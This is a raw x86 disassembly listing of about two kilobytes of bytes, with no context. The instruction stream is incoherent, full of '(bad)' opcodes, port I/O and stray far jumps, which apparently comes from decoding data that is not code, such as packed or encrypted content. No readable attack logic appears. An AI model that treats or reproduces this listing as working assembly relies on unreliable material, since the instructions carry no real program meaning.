  435387:	in     al,dx
  435388:	adc    DWORD PTR [esi+0x55561186],ebp
  43538e:	outs   dx,DWORD PTR ds:[esi]
  43538f:	inc    ebx
  435390:	inc    ecx
  435391:	lds    esp,FWORD PTR ds:0x4b6eefe7
  435397:	or     ebx,DWORD PTR [ebx]
  435399:	and    DWORD PTR [edi-0xf],edi
  43539c:	jb     0x435342
  43539e:	sub    BYTE PTR [edx],al
  4353a0:	push   ss
  4353a1:	retf   0xa363
  4353a4:	or     DWORD PTR [eax+0x4e57e2c1],ecx
  4353aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4353ab:	or     ah,BYTE PTR [eax+0x5b]
  4353ae:	jle    0x435402
  4353b0:	cwde   
  4353b1:	add    BYTE PTR [edi+0x54e661b8],al
  4353b7:	or     esi,DWORD PTR [edx*2-0x71259be5]
  4353be:	shl    bl,cl
  4353c0:	fadd   st,st(0)
  4353c2:	rcl    DWORD PTR [esi],1
  4353c4:	retf   0x416f
  4353c7:	outs   dx,BYTE PTR ds:[esi]
  4353c8:	verr   WORD PTR [edi]
  4353cb:	push   esp
  4353cc:	dec    edi
  4353cd:	pop    ds
  4353ce:	mov    bl,0x5b
  4353d0:	pop    ebx
  4353d1:	bound  esp,QWORD PTR [ecx+0x6d9cf104]
  4353d7:	in     eax,0xd4
  4353d9:	inc    edi
  4353da:	cmp    al,0xd1
  4353dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4353dd:	outs   dx,BYTE PTR ds:[esi]
  4353de:	test   ebp,ebx
  4353e0:	(bad)  
  4353e1:	out    0xa1,al
  4353e3:	push   esi
  4353e4:	fiadd  WORD PTR [esi+0x27]
  4353e7:	sub    al,0x2c
  4353e9:	xor    al,0x55
  4353eb:	push   ds
  4353ec:	cmp    eax,0x398b90d9
  4353f1:	shr    DWORD PTR [ebp+0x6d],0x2d
  4353f5:	out    dx,al
  4353f6:	test   eax,0xb785d48b
  4353fb:	(bad)  
  4353fc:	mov    eax,0x6dd17628
  435401:	dec    ebp
  435402:	add    al,BYTE PTR [eax+0xf]
  435405:	cwde   
  435406:	mov    esp,0x151d890
  43540b:	sbb    esi,DWORD PTR [eax-0x18]
  43540e:	push   esp
  43540f:	cwde   
  435410:	out    dx,eax
  435411:	sub    esi,DWORD PTR [eax]
  435413:	add    al,0x74
  435415:	push   ecx
  435416:	cmp    al,dh
  435418:	adc    eax,0xddadc51b
  43541d:	add    BYTE PTR [ebx-0x5e13c971],dl
  435423:	push   0x5c
  435425:	ss cs aam 0x44
  435429:	lds    edi,FWORD PTR [esi+0x4e35c953]
  43542f:	stos   BYTE PTR es:[edi],al
  435430:	add    eax,0xf7008eb7
  435435:	rcr    BYTE PTR [edx],1
  435437:	cli    
  435438:	jle    0x435450
  43543a:	mov    dh,0x5b
  43543c:	sbb    eax,0x9394f5f3
  435441:	leave  
  435442:	pop    ss
  435443:	xchg   ebp,eax
  435444:	sbb    al,0x31
  435446:	dec    ebx
  435447:	push   ecx
  435448:	ins    DWORD PTR es:[edi],dx
  435449:	(bad)  [ebx-0x1f08e8c3]
  43544f:	push   0xffffff8b
  435451:	adc    dl,BYTE PTR [eax+0x17]
  435454:	push   esp
  435455:	or     BYTE PTR [ebp+0x536d8030],ch
  43545b:	aad    0xe4
  43545d:	loopne 0x435462
  43545f:	ins    BYTE PTR es:[edi],dx
  435460:	and    BYTE PTR ds:0x9adb6170,bl
  435466:	fist   WORD PTR [esi+esi*4]
  435469:	jne    0x4354a3
  43546b:	sbb    al,0xa6
  43546d:	fmul   DWORD PTR [esi-0x5b]
  435470:	in     eax,dx
  435471:	fild   DWORD PTR [ebp-0x3b]
  435474:	mov    ah,0xa7
  435476:	into   
  435477:	pop    ss
  435478:	cmp    ecx,DWORD PTR [edx+0x15d6e877]
  43547e:	aam    0xe7
  435480:	aam    0x62
  435482:	aam    0xbf
  435484:	cmp    bl,BYTE PTR [esi]
  435486:	push   ebp
  435487:	je     0x435474
  435489:	mov    ds:0xca32b90e,al
  43548e:	cmp    BYTE PTR [ebp+0x233628ea],al
  435494:	add    al,0xcf
  435496:	and    eax,DWORD PTR [edx+0x4f]
  435499:	fisub  DWORD PTR [eax-0x60275dd5]
  43549f:	cmc    
  4354a0:	in     al,dx
  4354a1:	(bad)  
  4354a2:	jmp    0x1f5c:0x775c40d6
  4354a9:	out    dx,al
  4354aa:	rcr    DWORD PTR ds:0x1628bd39,0xb6
  4354b1:	xchg   BYTE PTR [eax],bh
  4354b3:	jne    0x435511
  4354b5:	xor    bl,BYTE PTR [eax-0x9]
  4354b8:	ret    0x6b56
  4354bb:	pop    ebx
  4354bc:	maxps  xmm1,XMMWORD PTR [esi]
  4354bf:	loope  0x435482
  4354c1:	dec    ecx
  4354c2:	push   es
  4354c3:	test   eax,0xedb5b6ed
  4354c8:	dec    ecx
  4354c9:	dec    edi
  4354ca:	pop    esp
  4354cb:	cmp    ecx,DWORD PTR cs:[eax]
  4354ce:	mov    al,ds:0xe333278f
  4354d3:	add    BYTE PTR [esi-0x1a94b4a5],dh
  4354d9:	fistp  WORD PTR [eax+0x86120cd]
  4354df:	fisub  DWORD PTR [eax-0x260578d2]
  4354e5:	mov    bh,0xb8
  4354e7:	hlt    
  4354e8:	mov    ah,0xed
  4354ea:	adc    eax,0x9a052112
  4354ef:	lods   eax,DWORD PTR ds:[esi]
  4354f0:	mov    dl,0x89
  4354f2:	sbb    eax,0x89ada0df
  4354f7:	fsub   DWORD PTR [edx-0x731c3d96]
  4354fd:	fsubr  QWORD PTR [edx+ebp*4-0x48]
  435501:	mov    ch,0x8
  435503:	out    0xb6,al
  435505:	mov    esi,0x6d714ca3
  43550a:	add    BYTE PTR [ebp+0x41],dh
  43550d:	aas    
  43550e:	mov    al,ds:0x51e088cd
  435513:	add    eax,0x1e3c140f
  435518:	mov    ch,0xdd
  43551a:	mov    dh,0x8d
  43551c:	pop    eax
  43551d:	add    al,0x5c
  43551f:	mov    bl,0xa4
  435521:	bound  edi,QWORD PTR ss:[ebx]
  435524:	mov    al,ds:0x50d6e0ab
  435529:	scas   eax,DWORD PTR es:[edi]
  43552a:	jmp    0x5d80:0xda484aa
  435531:	push   ebp
  435532:	mov    al,0x7
  435534:	shr    dh,cl
  435536:	ret    
  435537:	pop    ebp
  435538:	ins    DWORD PTR es:[edi],dx
  435539:	sub    ebp,ebp
  43553b:	add    BYTE PTR [ecx-0x1e],ch
  43553e:	pop    ecx
  43553f:	and    BYTE PTR [eax-0x4f],dl
  435542:	stos   BYTE PTR es:[edi],al
  435543:	push   ecx
  435544:	add    DWORD PTR [edi],edx
  435546:	mov    dh,0x46
  435548:	in     al,dx
  435549:	test   BYTE PTR [edx-0x12a42552],bl
  43554f:	inc    edx
  435550:	fstp   TBYTE PTR [ebp-0x10]
  435553:	shr    DWORD PTR [ebp-0x46225303],cl
  435559:	rcl    DWORD PTR [edx+0x57375013],cl
  43555f:	push   ebx
  435560:	xchg   ebp,eax
  435561:	or     ch,bh
  435563:	shl    DWORD PTR [ecx-0x57],cl
  435566:	push   ecx
  435567:	push   ebp
  435568:	xor    ebx,edx
  43556a:	es scas eax,DWORD PTR es:[edi]
  43556c:	outs   dx,DWORD PTR ds:[esi]
  43556d:	push   esp
  43556e:	inc    edi
  43556f:	fild   DWORD PTR [ebp-0x1e]
  435572:	(bad)  
  435573:	aad    0x86
  435575:	add    BYTE PTR [esi+0x6c],ch
  435578:	add    BYTE PTR [edx+0x232854d],cl
  43557e:	push   ebp
  43557f:	leave  
  435580:	shr    BYTE PTR [ebp+0x4b],cl
  435583:	pop    ebp
  435584:	inc    eax
  435585:	icebp  
  435586:	cs enter 0x718e,0xe2
  43558b:	pop    ebp
  43558c:	adc    DWORD PTR [esp+eax*2+0x59],ebp
  435590:	daa    
  435591:	jg     0x43556a
  435593:	inc    ebp
  435594:	sub    eax,0x201d0720
  435599:	push   0xffffffdb
  43559b:	add    al,0xb4
  43559d:	aam    0x56
  43559f:	cdq    
  4355a0:	repz pusha 
  4355a2:	je     0x43554a
  4355a4:	xor    al,0x1
  4355a6:	ins    DWORD PTR es:[edi],dx
  4355a7:	mov    ds:0xf9c3edfa,al
  4355ac:	aaa    
  4355ad:	aam    0x0
  4355af:	ins    BYTE PTR es:[edi],dx
  4355b0:	adc    BYTE PTR [esi-0x498f6c4f],ah
  4355b6:	fcmovnb st,st(6)
  4355b8:	mov    dh,0x5c
  4355ba:	jo     0xd1ffe982
  4355c0:	rcl    DWORD PTR [ebx],1
  4355c2:	xchg   bl,cl
  4355c4:	test   eax,0x5ba01add
  4355c9:	pop    esp
  4355ca:	mov    eax,ds:0x8c4dd94e
  4355cf:	inc    edx
  4355d0:	sti    
  4355d1:	lds    ebp,FWORD PTR [ebp-0x46]
  4355d4:	pop    ecx
  4355d5:	shl    DWORD PTR [ebp+edx*8+0x28],1
  4355d9:	sub    ah,BYTE PTR [ebx+ebx*2-0x17d97a49]
  4355e0:	fwait
  4355e1:	in     al,0xbd
  4355e3:	fisub  WORD PTR [eax-0x3753b2ea]
  4355e9:	cs sub al,0x34
  4355ec:	adc    BYTE PTR [ecx+0x4],cl
  4355ef:	and    eax,0x684894d5
  4355f4:	aam    0xe
  4355f6:	sub    bl,al
  4355f8:	and    BYTE PTR [edx+0x4f],dl
  4355fb:	add    eax,0x6da2e8f9
  435600:	push   edi
  435601:	scas   al,BYTE PTR es:[edi]
  435602:	cwde   
  435603:	mov    dh,0x47
  435605:	pop    eax
  435606:	sahf   
  435607:	inc    esp
  435608:	pop    es
  435609:	mov    cl,0x5c
  43560b:	pop    eax
  43560c:	(bad)  
  43560d:	jge    0x43568e
  43560f:	push   DWORD PTR [ebx-0xe]
  435612:	adc    bh,BYTE PTR [ebx-0x18]
  435615:	ret    0x8646
  435618:	pusha  
  435619:	push   eax
  43561a:	shr    BYTE PTR [ebp-0x1fdac0b],1
  435620:	xlat   BYTE PTR ds:[ebx]
  435621:	adc    eax,0x5b816175
  435626:	daa    
  435627:	or     al,0x99
  435629:	mov    esp,0x650aa8e9
  43562e:	or     DWORD PTR [edi-0x522ec978],edx
  435634:	ins    DWORD PTR es:[edi],dx
  435635:	sbb    edi,DWORD PTR [ecx-0x570425b3]
  43563b:	or     DWORD PTR [esi-0x4a49d79b],eax
  435641:	ins    DWORD PTR es:[edi],dx
  435642:	add    esp,esp
  435644:	xor    dl,BYTE PTR [eax]
  435646:	dec    ebp
  435647:	stos   DWORD PTR es:[edi],eax
  435648:	imul   esp,DWORD PTR [eax+edx*4+0x2d047602],0xffffffd0
  435650:	mov    ebx,0x10485995
  435655:	inc    esi
  435656:	retf   0xda05
  435659:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43565a:	sub    bl,al
  43565c:	inc    esp
  43565d:	das    
  43565e:	int3   
  43565f:	repnz mov dh,0x85
  435662:	dec    edi
  435663:	fnsave [esi]
  435665:	xchg   ebx,eax
  435666:	adc    esi,DWORD PTR [ecx-0xd]
  435669:	xchg   ebp,eax
  43566a:	pop    ebp
  43566b:	repz or eax,0xb616178e
  435671:	in     eax,0xd3
  435673:	add    BYTE PTR [esi+edi*1+0x62b51723],ah
  43567a:	sub    BYTE PTR [ebx],dh
  43567c:	pop    es
  43567d:	ins    DWORD PTR es:[edi],dx
  43567e:	sub    ebp,edi
  435680:	or     cl,BYTE PTR [eax-0x47ffb7f2]
  435686:	lods   eax,DWORD PTR ds:[esi]
  435687:	repnz push es
  435689:	and    BYTE PTR [esi],al
  43568b:	xor    al,0x10
  43568d:	les    ebx,FWORD PTR [ebx+0x4e]
  435690:	fsub   QWORD PTR [ecx+0x6b7040b1]
  435696:	mov    bh,0x2
  435698:	repnz (bad) 
  43569a:	push   ebx
  43569b:	rcr    DWORD PTR [esi+0x1b0b4ba0],1
  4356a1:	pop    ebp
  4356a2:	ds inc ebx
  4356a4:	push   ecx
  4356a5:	jb     0x43565f
  4356a7:	adc    eax,0x685897b0
  4356ac:	add    BYTE PTR [esi-0x14],ch
  4356af:	mov    bh,0xee
  4356b1:	cmp    DWORD PTR [edi],ebx
  4356b3:	xor    al,0xc
  4356b5:	shr    BYTE PTR [esi+0x4b],1
  4356b8:	add    eax,0xc29c0bd6
  4356bd:	mov    ebx,0x8abdbf4c
  4356c2:	call   0x98bcf47d
  4356c7:	and    al,0x20
  4356c9:	xor    BYTE PTR [ebx+0x796c6e02],ah
  4356cf:	xlat   BYTE PTR ds:[ebx]
  4356d0:	cdq    
  4356d1:	push   ss
  4356d2:	out    0x71,eax
  4356d4:	inc    esp
  4356d5:	rol    DWORD PTR [ebp+0x50c903b6],0xb5
  4356dc:	sub    ebx,ebx
  4356de:	push   ebx
  4356df:	adc    al,0xbf
  4356e1:	ficomp DWORD PTR [ebx+0x8]
  4356e4:	xchg   ebx,eax
  4356e5:	adc    DWORD PTR [esi+ebp*2],eax
  4356e8:	mov    cl,0x6b
  4356ea:	imul   eax,DWORD PTR [edx-0x2c959a9e],0xffffff96
  4356f1:	pop    esp
  4356f2:	aad    0x28
  4356f4:	push   0x647104cd
  4356f9:	loopne 0x43571a
  4356fb:	pop    ds
  4356fc:	sbb    al,BYTE PTR [ebx+ebx*2]
  4356ff:	adc    ebx,DWORD PTR [ebp+0x5b]
  435702:	test   DWORD PTR [ecx],edx
  435704:	ficom  WORD PTR [esi]
  435706:	sbb    eax,0xd44d0b3d
  43570b:	lods   eax,DWORD PTR ds:[esi]
  43570c:	mov    al,0x3e
  43570e:	mov    ecx,0x9db96d87
  435713:	pop    ebp
  435714:	shr    DWORD PTR [esi+0x1b],1
  435717:	ins    DWORD PTR es:[edi],dx
  435718:	cmp    ecx,esp
  43571a:	(bad)  
  43571b:	or     esp,esi
  43571d:	jecxz  0x435712
  43571f:	push   ebx
  435720:	mov    dh,0x13
  435722:	push   ecx
  435723:	or     esp,ecx
  435725:	or     BYTE PTR [eax],cl
  435727:	dec    edx
  435728:	add    ecx,DWORD PTR [edx-0x7622efe3]
  43572e:	cmp    al,0x49
  435730:	jne    0x4356c5
  435732:	jb     0x43573d
  435734:	fcmovb st,st(2)
  435736:	push   es
  435737:	sar    DWORD PTR [ebx+ebp*8-0x7b],cl
  43573b:	sti    
  43573c:	lods   eax,DWORD PTR ds:[esi]
  43573d:	je     0x435783
  43573f:	ins    DWORD PTR es:[edi],dx
  435740:	add    BYTE PTR [edx+0x1e],ch
  435743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435744:	pusha  
  435745:	sahf   
  435746:	(bad)  
  435747:	outs   dx,BYTE PTR ds:[esi]
  435748:	ins    BYTE PTR es:[edi],dx
  435749:	je     0x435737
  43574b:	pop    edi
  43574c:	fsubp  st(7),st
  43574e:	test   BYTE PTR [ecx+edx*8-0x52240147],0x7d
  435756:	loopne 0x4356f4
  435758:	add    esi,DWORD PTR [ebp-0x75]
  43575b:	sbb    bh,al
  43575d:	mov    bl,0xb0
  43575f:	xchg   edi,eax
  435760:	pop    ecx
  435761:	fild   DWORD PTR es:[eax+0x11]
  435765:	dec    ebx
  435766:	and    BYTE PTR [ecx],bh
  435768:	xor    bh,dh
  43576a:	jl     0x43577d
  43576c:	mov    dh,0x41
  43576e:	or     ebx,DWORD PTR [ebx-0x71]
  435771:	pop    ebx
  435772:	dec    edi
  435773:	push   esp
  435774:	in     eax,0x88
  435776:	xor    BYTE PTR [esi-0x2a8a50],0xcd
  43577d:	mov    ch,0x56
  43577f:	jns    0x43578e
  435781:	idiv   BYTE PTR [edx+0x7]
  435784:	aam    0xd6
  435786:	(bad)  
  435787:	hlt    
  435788:	pop    ebx
  435789:	pop    esi
  43578a:	pop    edi
  43578b:	into   
  43578c:	push   edi
  43578d:	ret    0x6a5
  435790:	push   0x6d62600e
  435795:	sub    DWORD PTR [edx-0x4d],edx
  435798:	mov    DWORD PTR [esi],0x188da094
  43579e:	xchg   edx,eax
  43579f:	push   esp
  4357a0:	add    edx,DWORD PTR [esi+0x45c01076]
  4357a6:	scas   eax,DWORD PTR es:[edi]
  4357a7:	shl    DWORD PTR [edx],0x44
  4357aa:	stos   BYTE PTR es:[edi],al
  4357ab:	(bad)  
  4357ad:	call   0x1c0f44dc
  4357b2:	and    eax,0x2a23475
  4357b7:	aam    0x15
  4357b9:	ins    DWORD PTR es:[edi],dx
  4357ba:	or     al,0xa5
  4357bc:	ins    DWORD PTR es:[edi],dx
  4357bd:	jg     0x435787
  4357bf:	pop    ebp
  4357c0:	push   ebp
  4357c1:	mov    bh,0x85
  4357c3:	in     eax,0x2
  4357c5:	mov    DWORD PTR [eax],ebx
  4357c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4357c8:	xchg   edi,eax
  4357c9:	aaa    
  4357ca:	popa   
  4357cb:	imul   eax,DWORD PTR [ecx+0x6c],0x44
  4357cf:	xchg   esi,eax
  4357d0:	mov    edx,0xd90dd8ce
  4357d5:	fadd   DWORD PTR ds:0xf7f2aa70
  4357db:	inc    eax
  4357dc:	and    ch,BYTE PTR [edx]
  4357de:	push   cs
  4357df:	mov    eax,ds:0x416d6e80
  4357e4:	das    
  4357e5:	xchg   ebp,eax
  4357e6:	inc    ebp
  4357e7:	in     eax,dx
  4357e8:	dec    ebp
  4357e9:	sub    dh,BYTE PTR [esi]
  4357eb:	push   eax
  4357ec:	mov    ah,0xa7
  4357ee:	ja     0x4357dc
  4357f0:	js     0x43584f
  4357f2:	fist   DWORD PTR [ebp-0x4c]
  4357f5:	mov    eax,ds:0x59c94f7e
  4357fa:	cld    
  4357fb:	fmul   DWORD PTR [esi]
  4357fd:	fstp   TBYTE PTR [edx-0x1301a478]
  435803:	sub    ch,bl
  435805:	dec    ebp
  435806:	sub    al,0x42
  435808:	loopne 0x43583f
  43580a:	adc    eax,eax
  43580c:	ins    DWORD PTR es:[edi],dx
  43580d:	push   eax
  43580e:	pop    ecx
  43580f:	pop    edi
  435810:	and    DWORD PTR ds:0x8ea5cfe,edx
  435816:	mov    edx,0xc1f322f
  43581b:	xor    eax,0x6e25ae65
  435820:	pop    ebx
  435821:	inc    ebx
  435822:	inc    ebp
  435823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435824:	push   0x746b3ce0
  435829:	addr16 push esp
  43582b:	mov    bh,0xa6
  43582d:	add    bl,dh
  43582f:	or     BYTE PTR [eax-0x3a2f45d0],dh
  435835:	inc    esi
  435836:	inc    ebx
  435837:	fs stos BYTE PTR es:[edi],al
  435839:	data16 or al,0x75
  43583c:	sbb    al,0xb6
  43583e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43583f:	ret    0x7d11
  435842:	fdivr  st(0),st
  435844:	or     edi,DWORD PTR [edx]
  435846:	or     ah,BYTE PTR [eax+0x9]
  435849:	fadd   DWORD PTR [eax+0x135ca4d]
  43584f:	push   0x494cba89
  435854:	sar    BYTE PTR [esi-0x2aeb2e89],cl
  43585a:	mov    dh,0x6
  43585c:	pop    edx
  43585d:	mov    ecx,0xe2d8ad19
  435862:	aam    0xc2
  435864:	push   es
  435865:	jne    0x435879
  435867:	adc    BYTE PTR [edx-0x7f],dl
  43586a:	sbb    esi,DWORD PTR [ebp-0x4cf91ef0]
  435870:	fnstenv [esp+ebp*8+0x5adc104d]
  435877:	jl     0x43583b
  435879:	push   cs
  43587a:	in     al,0x6
  43587c:	stc    
  43587d:	ins    BYTE PTR es:[edi],dx
  43587e:	mov    al,0xb
  435880:	mov    al,ds:0x2bff8934
  435885:	imul   ebp,DWORD PTR [esi+0x2d],0x28
  435889:	add    esi,DWORD PTR [ebp-0x77aac3c0]
  43588f:	clc    
  435890:	les    ebp,FWORD PTR [ebp+0xa9ff701]
  435896:	xchg   ecx,eax
  435897:	cmp    ecx,DWORD PTR [edx]
  435899:	inc    ecx
  43589a:	add    eax,0x9673eb6a
  43589f:	je     0x435904
  4358a1:	mov    cl,0xbc
  4358a3:	mov    ah,0x75
  4358a5:	test   eax,0x5f8830a
  4358aa:	cmp    eax,0xe2a163
  4358af:	stos   BYTE PTR es:[edi],al
  4358b0:	dec    ebx
  4358b1:	in     eax,dx
  4358b2:	(bad)  
  4358b3:	mov    dh,0x99
  4358b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4358b6:	jmp    0x6f1709d3
  4358bb:	sub    al,0xba
  4358bd:	mov    ah,0x6d
  4358bf:	and    cl,BYTE PTR [eax+0x2040cbde]
  4358c5:	mov    al,0x1a
  4358c7:	(bad)
  4358ca:	pop    es
  4358cb:	mov    ds,WORD PTR [eax-0x31]
  4358ce:	ja     0x43591e
  4358d0:	paddb  mm4,QWORD PTR [ebp+0x7616515]
  4358d7:	mov    ebp,0x837645c
  4358dc:	add    BYTE PTR [esi+0x1d8682d],dh
  4358e2:	xchg   esi,eax
  4358e3:	sub    eax,0xb
  4358e6:	mov    edx,0xcebebb7d
  4358eb:	mov    ?,esi
  4358ed:	loop   0x4358f1
  4358ef:	enter  0xc282,0x7c
  4358f3:	push   0xffffff8b
  4358f5:	xchg   esi,eax
  4358f6:	sub    al,0x63
  4358f8:	mov    ds:0x3c32fb1,al
  4358fd:	mov    bl,BYTE PTR [ebp+0x5]
  435900:	push   edi
  435901:	in     al,dx
  435902:	into   
  435903:	add    eax,0xa0a36d6e
  435908:	push   edi
  435909:	jne    0x4358f2
  43590b:	inc    edi
  43590c:	pop    edi
  43590d:	lods   al,BYTE PTR ds:[esi]
  43590e:	push   ecx
  43590f:	mov    dh,BYTE PTR [esi+0x11412201]
  435915:	jae    0x4358a6
  435917:	(bad)  
  435918:	cs call 0xf0dbae74
  43591e:	jle    0x43594f
  435920:	and    DWORD PTR [eax],esi
  435922:	test   al,0x1d
  435924:	adc    ah,bl
  435926:	mov    dh,0x14
  435928:	pop    ds
  435929:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43592a:	push   edx
  43592b:	sub    dh,ah
  43592d:	mov    eax,ds:0xb5bb5b1b
  435932:	adc    DWORD PTR [ecx+0xb7b73fb],esp
  435938:	jecxz  0x4358f9
  43593a:	sub    eax,0xcb883a89
  43593f:	adc    ch,BYTE PTR [eax]
  435941:	sti    
  435942:	ss sub al,0xf6
  435945:	idiv   BYTE PTR [edx+0x47866ed5]
  43594b:	mov    al,0xf3
  43594d:	stos   BYTE PTR es:[edi],al
  43594e:	sub    al,0x94
  435950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435951:	out    dx,al
  435952:	or     al,bl
  435954:	or     ah,BYTE PTR [esi]
  435956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435957:	sub    al,0x17
  435959:	mov    bh,0x2e
  43595b:	jge    0x43598a
  43595d:	in     al,dx
  43595e:	sbb    eax,0x4c079d78
  435963:	mov    ebx,0x7723847
  435968:	adc    eax,DWORD PTR [ebx+ebx*4]
  43596b:	add    dl,BYTE PTR [esi]
  43596d:	jl     0x435942
  43596f:	out    0x80,eax
  435971:	lods   eax,DWORD PTR ds:[esi]
  435972:	add    ebp,DWORD PTR [edx-0x7d]
  435975:	out    dx,eax
  435976:	cld    
  435977:	fwait
  435978:	sub    DWORD PTR [edi-0x5e],ebp
  43597b:	or     ebx,DWORD PTR [ebx]
  43597d:	(bad)  
  43597e:	repnz sub eax,0x5e024f04
  435984:	sbb    eax,0xf8a0edb1
  435989:	push   esp
  43598a:	pop    esp
  43598b:	or     BYTE PTR [eax+0x4d],0xf
  43598f:	fstp   TBYTE PTR [edx-0x4dcc4960]
  435995:	push   ss
  435996:	test   DWORD PTR [eax+edi*1],ebp
  435999:	popa   
  43599a:	dec    ebp
  43599b:	rol    DWORD PTR ds:0x7d0870b0,1
  4359a1:	xchg   esp,eax
  4359a2:	popa   
  4359a3:	std    
  4359a4:	adc    BYTE PTR ds:0x54b14b54,bl
  4359aa:	(bad)  
  4359ab:	fs dec esp
  4359ad:	dec    esp
  4359ae:	in     al,dx
  4359af:	add    al,0xbb
  4359b1:	and    BYTE PTR [esi+0x26],ch
  4359b4:	enter  0xe152,0xd4
  4359b8:	pop    esi
  4359b9:	mov    al,0x1
  4359bb:	mov    ch,0x35
  4359bd:	enter  0xcbfe,0x5a
  4359c1:	iret   
  4359c2:	scas   al,BYTE PTR es:[edi]
  4359c3:	mov    dh,0x11
  4359c5:	dec    ebp
  4359c6:	inc    ecx
  4359c7:	jp     0x4359d9
  4359c9:	pop    edi
  4359ca:	loopne 0x4359ce
  4359cc:	fist   DWORD PTR [esi-0x56]
  4359cf:	rcr    BYTE PTR [edi-0x5f],cl
  4359d2:	outs   dx,BYTE PTR ds:[esi]
  4359d3:	bound  ecx,QWORD PTR [esi-0x80]
  4359d6:	inc    edx
  4359d7:	add    al,dl
  4359d9:	mov    al,cs:0x9089112a
  4359df:	cs ins DWORD PTR es:[edi],dx
  4359e1:	pop    ebx
  4359e2:	(bad)  [edx-0x7c]
  4359e5:	(bad)  
  4359e6:	xchg   ebp,eax
  4359e7:	das    
  4359e8:	sub    al,cl
  4359ea:	or     eax,0x6d29b6b6
  4359ef:	sub    eax,DWORD PTR ds:0x4ace7dd4
  4359f5:	test   al,0x26
  4359f7:	push   esi
  4359f8:	fcom   DWORD PTR [eax]
  4359fa:	les    esp,FWORD PTR [edi+0x3b0409d2]
  435a00:	call   0xdfdb:0x89e961c5
  435a07:	push   esi
  435a08:	clc    
  435a09:	dec    ebp
  435a0a:	pop    ebx
  435a0b:	or     DWORD PTR [edx+ebx*8-0x7a2492d2],ecx
  435a12:	jbe    0x435a61
  435a14:	loop   0x435a3f
  435a16:	pop    ds
  435a17:	xchg   ecx,eax
  435a18:	(bad)
  435a1d:	sub    BYTE PTR [esi+0x50],dh
  435a20:	mov    al,0x41
  435a22:	icebp  
  435a23:	repnz xor BYTE PTR [ebp+eiz*4-0x2cd65e8e],dh
  435a2b:	dec    ebx
  435a2c:	hlt    
  435a2d:	(bad)  
  435a2e:	call   0x11b6:0x361711d4
  435a35:	pop    ss
  435a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435a37:	pusha  
  435a38:	mov    ah,0x19
  435a3a:	push   ebp
  435a3b:	sbb    DWORD PTR [ebx-0x45],0x1fb815d1
  435a42:	xor    BYTE PTR [eax+0xb],dl
  435a45:	or     edx,DWORD PTR [edx-0x55949e22]
  435a4b:	outs   dx,BYTE PTR ds:[esi]
  435a4c:	add    bh,BYTE PTR [ebx+0x67]
  435a4f:	nop
  435a50:	adc    bl,BYTE PTR [edi+0x5b]
  435a53:	sub    BYTE PTR [ebp+0x43],0xd5
  435a57:	ins    DWORD PTR es:[edi],dx
  435a58:	xor    bh,dh
  435a5a:	je     0x435ad6
  435a5c:	inc    eax
  435a5d:	into   
  435a5e:	mov    ds:0x6db6c74d,al
  435a63:	or     esi,esp
  435a65:	pusha  
  435a66:	pop    ecx
  435a67:	sub    BYTE PTR [edi+0x3f],bl
  435a6a:	stos   BYTE PTR es:[edi],al
  435a6b:	adc    bh,ah
  435a6d:	sub    eax,0xfe362614
  435a72:	push   0x29bc51d9
  435a77:	sub    BYTE PTR [esi+0x55],dh
  435a7a:	mov    eax,0x743aa739
  435a7f:	adc    al,0xc0
  435a81:	lods   eax,DWORD PTR ds:[esi]
  435a82:	loope  0x435a95
  435a84:	xchg   esp,eax
  435a85:	xlat   BYTE PTR ds:[ebx]
  435a86:	neg    ch
  435a88:	adc    ch,al
  435a8a:	lea    eax,[esi]
  435a8c:	adc    eax,0x43578751
  435a91:	mov    ah,0x9
  435a93:	fsubr  DWORD PTR [eax-0x69]
  435a96:	jno    0x435aae
  435a98:	pusha  
  435a99:	ja     0x435acc
  435a9b:	inc    ecx
  435a9c:	mov    ah,0xa9
  435a9e:	push   0xffffff88
  435aa0:	cmp    dh,cl
  435aa2:	cwde   
  435aa3:	fcmovbe st,st(4)
  435aa5:	mov    dh,0xb
  435aa7:	pop    ebp
  435aa8:	mov    edi,0x2f0ca57
  435aad:	dec    edx
  435aae:	stc    
  435aaf:	pop    ecx
  435ab0:	push   0x2cb1b6e3
  435ab5:	(bad)  
  435ab6:	pop    ebp
  435ab7:	mov    eax,ds:0xf50504a
  435abc:	ss push ebp
  435abe:	mov    ah,0x6d
  435ac0:	cmp    BYTE PTR [ebx],0xa4
  435ac3:	jne    0x435aba
  435ac5:	sub    BYTE PTR [eax+eax*4+0x6e],ch
  435ac9:	pop    ebp
  435aca:	xchg   edx,eax
  435acb:	push   cs
  435acc:	enter  0x2673,0x80
  435ad0:	das    
  435ad1:	jl     0x435afb
  435ad3:	outs   dx,BYTE PTR ds:[esi]
  435ad4:	dec    ebp
  435ad5:	push   ebp
  435ad6:	fistp  QWORD PTR [edx+0x636a512f]
  435adc:	mov    ds:0xa821a3b5,eax
  435ae1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435ae2:	shr    DWORD PTR [ecx-0x75],cl
  435ae5:	data16 xor al,0x45
  435ae8:	frstor [edx-0x2e]
  435aeb:	stos   DWORD PTR es:[edi],eax
  435aec:	ret    0xbed2
  435aef:	pusha  
  435af0:	sbb    al,0x6c
  435af2:	sub    al,0x6c
  435af4:	(bad)  
  435af5:	(bad)  
  435af6:	scas   eax,DWORD PTR es:[edi]
  435af7:	out    0x3f,al
  435af9:	xor    al,0xaa
  435afb:	pop    ebx
  435afc:	pop    es
  435afd:	adc    eax,0x76667f17
  435b02:	jb     0x435b45
  435b04:	add    cl,BYTE PTR [esi+0x42c2ea3b]
  435b0a:	mov    edx,ebp
  435b0c:	ins    DWORD PTR es:[edi],dx
  435b0d:	fsub   DWORD PTR [edi+0x9]
  435b10:	and    dl,BYTE PTR [ebx+0x6d107688]
  435b16:	pop    ss
  435b17:	mov    dl,0x11
  435b19:	and    eax,0xb6c001c0
